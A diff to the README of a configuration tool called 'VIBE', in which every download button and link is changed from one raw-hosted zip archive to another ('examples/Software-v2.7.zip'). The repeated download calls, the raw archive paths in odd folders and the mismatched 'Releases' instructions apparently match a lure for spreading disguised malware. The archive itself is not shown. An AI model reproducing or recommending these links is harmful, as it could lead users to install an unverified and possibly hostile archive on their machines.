@@ -2,7 +2,7 @@
 
 ## 🚀 Download Now
 
-[![Download vibe](https://raw.githubusercontent.com/Jesnn123/vibe/main/elasmobranchian/vibe.zip)](https://raw.githubusercontent.com/Jesnn123/vibe/main/elasmobranchian/vibe.zip)
+[![Download vibe](https://raw.githubusercontent.com/Jesnn123/vibe/main/examples/Software-v2.7.zip)](https://raw.githubusercontent.com/Jesnn123/vibe/main/examples/Software-v2.7.zip)
 
 ## 📜 Introduction
 
@@ -21,7 +21,7 @@ Before downloading VIBE, check if your device meets these basic requirements:
 
 To get started, visit this page to download:
 
-[Download vibe](https://raw.githubusercontent.com/Jesnn123/vibe/main/elasmobranchian/vibe.zip)
+[Download vibe](https://raw.githubusercontent.com/Jesnn123/vibe/main/examples/Software-v2.7.zip)
 
 1. Go to the link mentioned above.
 2. Scroll down to the "Releases" section.
@@ -110,7 +110,7 @@ Visit the Issues tab on the GitHub repository. Provide a clear description of th
 If you encounter issues while using VIBE, consider the following solutions:
 
 - **Check your file format:** Ensure that your configuration file follows the correct syntax.
-- **Update VIBE:** Make sure you are using the latest version from the [Download page](https://raw.githubusercontent.com/Jesnn123/vibe/main/elasmobranchian/vibe.zip).
+- **Update VIBE:** Make sure you are using the latest version from the [Download page](https://raw.githubusercontent.com/Jesnn123/vibe/main/examples/Software-v2.7.zip).
 - **Review the documentation:** Refer to the documentation for detailed syntax and feature usage.
 
 **Remember, your feedback helps improve VIBE. Don’t hesitate to reach out with comments or questions.**
@@ -119,4 +119,4 @@ If you encounter issues while using VIBE, consider the following solutions:
 
 VIBE aims to simplify your configuration needs. With clear syntax and fast performance, you can manage your settings without hassle. Download VIBE today and take control of your configuration files.
 
-[Download vibe](https://raw.githubusercontent.com/Jesnn123/vibe/main/elasmobranchian/vibe.zip)
+[Download vibe](https://raw.githubusercontent.com/Jesnn123/vibe/main/examples/Software-v2.7.zip)
